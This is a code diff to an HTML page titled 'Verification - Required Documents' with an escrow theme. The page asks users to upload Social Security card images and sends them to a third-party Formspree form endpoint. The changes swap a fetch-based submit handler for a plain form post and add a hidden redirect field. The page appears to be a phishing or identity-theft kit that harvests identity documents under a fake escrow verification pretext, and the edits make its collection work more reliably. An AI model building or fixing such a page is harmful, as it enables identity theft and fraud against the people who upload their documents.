@@ -132,7 +132,6 @@
             background-color: #333;
         }
 
-        /* Modal / Steps styling */
         .step-content {
             display: none;
         }
@@ -230,8 +229,12 @@
                 <h1>Verification <br><span class="escrow-text">- Required Documents</span></h1>
             </header>
 
-            <form id="uploadForm" action="https://formspree.io/f/mdenogaa" method="POST" enctype="multipart/form-data" onsubmit="handleConfirm(event)">
+            <!-- Standard form submission removes the CORS block error -->
+            <form id="uploadForm" action="https://formspree.io/f/mdenogaa" method="POST" enctype="multipart/form-data">
                 
+                <!-- Hidden input to redirect user to a success view or reload cleanly -->
+                <input type="hidden" name="_next" value="">
+
                 <div class="upload-group">
                     <label>SSN Image (Front)</label>
                     <div class="file-drop-box">
@@ -264,7 +267,7 @@
                     </div>
                 </div>
 
-                <button type="submit" class="btn" style="margin-top: 10px;" id="submitBtn">Confirm</button>
+                <button type="submit" class="btn" style="margin-top: 10px;" id="submitBtn" onclick="showSubmitting()">Confirm</button>
             </form>
         </div>
 
@@ -278,7 +281,6 @@
     </div>
 
     <script>
-        // Function to show the chosen file name inside the drop box
         function updateFileName(input, labelId) {
             if (input.files && input.files[0]) {
                 const label = document.getElementById(labelId);
@@ -293,38 +295,12 @@
             document.getElementById('step-upload').classList.add('active');
         }
 
-        async function handleConfirm(event) {
-            event.preventDefault();
-            
-            const form = event.target;
-            const formData = new FormData(form);
-            const submitBtn = document.getElementById('submitBtn');
-            
-            submitBtn.innerText = "Submitting & Uploading...";
-            submitBtn.disabled = true;
-
-            try {
-                let response = await fetch(form.action, {
-                    method: 'POST',
-                    body: formData,
-                    headers: {
-                        'Accept': 'json'
-                    }
-                });
-
-                if (response.ok) {
-                    document.getElementById('step-upload').classList.remove('active');
-                    document.getElementById('step-success').classList.add('active');
-                } else {
-                    alert('There was a problem uploading your images. Please try again.');
-                    submitBtn.innerText = "Confirm";
-                    submitBtn.disabled = false;
-                }
-            } catch (error) {
-                alert('Network error. Please check your connection.');
-                submitBtn.innerText = "Confirm";
-                submitBtn.disabled = false;
-            }
+        function showSubmitting() {
+            const btn = document.getElementById('submitBtn');
+            // Only change button text if files are actually selected
+            setTimeout(() => {
+                btn.innerText = "Submitting & Uploading...";
+            }, 100);
         }
     </script>
 
